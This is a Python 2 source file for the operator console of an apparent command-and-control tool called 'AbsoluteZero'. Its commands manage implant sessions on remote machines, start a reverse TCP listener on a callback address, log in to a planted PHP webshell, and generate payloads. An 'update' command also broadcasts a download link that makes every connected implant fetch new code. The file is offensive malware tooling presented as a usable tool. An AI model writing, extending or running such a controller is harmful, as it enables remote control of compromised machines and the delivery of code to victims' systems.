import threading
import os
import sys
import help

from core.handler import TCPhandler, PHPhandler
from core.color import color
from core.data import viewbag
from core.utils import tools
from core.config import xmllib
from payloads import modulehelper
from payloads.builder import payloadgen
from core.data import options
from core.log import log


class CLI:
    def __init__(self):
        pass

    @staticmethod
    def InitializeEnvironemnt():
        if os.name == 'nt':
            bfolder = os.getenv('APPDATA') + '\Microsoft\Templates\AbsoluteZero'
        else:
            from os.path import expanduser
            bfolder = expanduser("~") + '/AbsoluteZero'
        tools.mkdir(bfolder)
        viewbag.ENVIRONMENT_FOLDER = bfolder

    @staticmethod
    def console():
        CLI.InitializeEnvironemnt()
        while True:
            try:
                sys.stdout.write(color.ReturnConsole('ab0'))
                command = raw_input('')
                if command != '':
                    log.doLog('[COMMAND] ' + str(command))
                    if command.startswith('sessions '):
                        try:
                            if command.split(' ')[1] == "-v":
                                print TCPhandler.Helper.ListSessions()
                                continue
                            _, argument, parameter = command.split(' ')
                            if argument == "-i":
                                TCPhandler.Helper.ImplantInteraction(int(parameter))
                            elif argument == "-k":
                                TCPhandler.Helper.KillImplant(int(parameter))
                                print "\n" + color.ReturnError('Session Index "%s" killed => tcp://%s:%s\n' % (
                                    str(parameter), viewbag.all_addresses[int(parameter)][0], viewbag.all_addresses[int(parameter)][1]))
                                TCPhandler.Helper.RemoveSession(int(parameter))
                            else:
                                print color.ReturnError('Invalid argument "%s"' % argument)
                            pass
                        except IndexError:
                            print color.ReturnError('No sessions open at index "%s"\n' % command.split(' ')[2])
                        except Exception, e:
                            print color.ReturnError('Console -> ' + str(e))
                    elif command == "show options":
                        print options.ShowOptions()
                    elif command.startswith('payloadgen'):
                        try:
                            payloadgen.PayloadGenerator.Generate(command)
                        except Exception, e:
                            print color.ReturnError(str(e))
                    elif command == "update":
                        try:
                            print 'Choose the vector method to download the new version:\n\n1) Direct Link\n2) Upload from local drive\n'
                            choose = int(raw_input(''))
                            if choose == 1:
                                print color.ReturnQuestion('Insert the direct link (be sure that the file is public accessibly): ')
                                link = raw_input('')
                                if link != '':
                                    TCPhandler.Helper.Broadcast('\x22' + viewbag.SPL + link)
                                else:
                                    print color.ReturnError('Link cannot be empty.')
                            elif choose == 2:
                                pass
                            else:
                                print color.ReturnError('Invalid choose selection.')
                        except Exception, e:
                            print color.ReturnError(str(e))
                    elif command.startswith('run '):
                        try:
                            _, argument = command.split(' ')
                            if argument == "tcp":
                                if not viewbag.SERVER_STATUS:
                                    if not viewbag.PORT_LIST:
                                        print color.ReturnError('Error: port list is empty.')
                                    elif not viewbag.CALLBACK_IP:
                                        print color.ReturnError('Error: callback ip is not defined.')
                                    else:
                                        print ''
                                        print color.ReturnInfo('Started Reverse TCP Handler on %s:%s\n' % (
                                            viewbag.CALLBACK_IP, TCPhandler.Helper.GetPrintablePorts()))

                                        thread = threading.Thread(target=TCPhandler.Helper.StartTcpHandler)
                                        thread.daemon = True
                                        thread.start()
                                        viewbag.SERVER_STATUS = True
                                else:
                                    print color.ReturnError('Server is already online.')
                            elif argument == "php":
                                if not PHPhandler.webshell_ip :
                                    print color.ReturnError('Error -> PHP handler webshell_ip must not be empty.')
                                    continue
                                elif not PHPhandler.webshell_port:
                                    print color.ReturnError('Error -> PHP handler webshell_port must not be empty.')
                                    continue
                                elif not PHPhandler.webshell_password:
                                    print color.ReturnError('Error -> PHP handler webshell_password must not be empty.')
                                    continue
                                elif not PHPhandler.webshell_page_name:
                                    print color.ReturnError('Error -> PHP handler webshell_page_name must not be empty.')
                                    continue
                                else:
                                    PHPhandler.Connect()
                                    continue
                            else:
                                print color.ReturnError('Unrecognized argument "%s"' % argument)
                        except Exception, e:
                            print color.ReturnError('Console -> ' + str(e))
                    elif command.startswith('set '):
                        try:
                            _, argument, parameter = command.split(' ')
                            if argument == "CALLBACK_IP":
                                TCPhandler.Helper.InitializeIp(parameter)
                            elif argument == "CALLBACK_PORTS":
                                TCPhandler.Helper.InitializePorts(parameter)
                            elif argument == "MAX_CONN":
                                viewbag.MAX_CONN = int(parameter)
                                print "MAX_CONN => " + parameter
                            elif argument == "MESSAGE_LENGTH_SHOW":
                                if parameter == 'True':
                                    viewbag.MESSAGE_LENGTH_SHOW = True
                                else:
                                    viewbag.MESSAGE_LENGTH_SHOW = False
                                print "MESSAGE_LENGTH_SHOW => " + parameter
                            elif argument == "ENVIRONMENT_FOLDER":
                                if tools.mkdir(parameter):
                                    viewbag.ENVIRONMENT_FOLDER = parameter
                                    print "ENVIRONMENT_FOLDER => " + parameter
                            elif argument == "NOTIFY_CONNECTION":
                                if parameter == 'True':
                                    viewbag.NOTIFY_CONNECTION = True
                                else:
                                    viewbag.NOTIFY_CONNECTION = False
                                print "NOTIFY_CONNECTION => " + parameter
                            elif argument == "AUTOSTART_TCP":
                                if parameter == 'True':
                                    viewbag.AUTOSTART_TCP = True
                                else:
                                    viewbag.AUTOSTART_TCP = False
                                print "AUTOSTART_TCP => " + parameter
                            else:
                                print color.ReturnError('Unrecognized argument "%s"' % argument)
                        except Exception, e:
                            print color.ReturnError('Console -> ' + str(e))
                    elif command.startswith('php '):
                        try:
                            if command.split(' ')[1] == "show":
                                if command.split(' ')[2] == "options":
                                    print PHPhandler.ShowOptions()
                            else:
                                _, field, value = command.split(' ')
                                PHPhandler.SetField(field, value)
                        except Exception, e:
                            print color.ReturnError('Php set error -> %s.' % str(e))
                    elif command.startswith('config '):
                        try:
                            argument = command.split(' ')[1]
                            if argument == "save":
                                xmllib.save()
                            elif argument == "remove":
                                xmllib.remove()
                            else:
                                print color.ReturnError('Unrecognized argument "%s".' % argument)
                        except Exception, e:
                            print color.ReturnError('Configuration error -> %s.' % str(e))
                    elif command == "modules":
                        print "\n" + color.ReturnTabulate(modulehelper.ListModules(), ['Name', 'Description'],
                                                          "simple") + "\n"
                    elif command == "exit":
                        TCPhandler.Helper.DisconnectImplants()
                        os._exit(0)
                    elif command == "help":
                        print help.help()

                    else:
                        print color.ReturnError('Command "%s" unrecognized, type <<help>> for command list.' % command)
            except KeyboardInterrupt:
                print '\n' + color.ReturnError('Type "exit" to quit.')
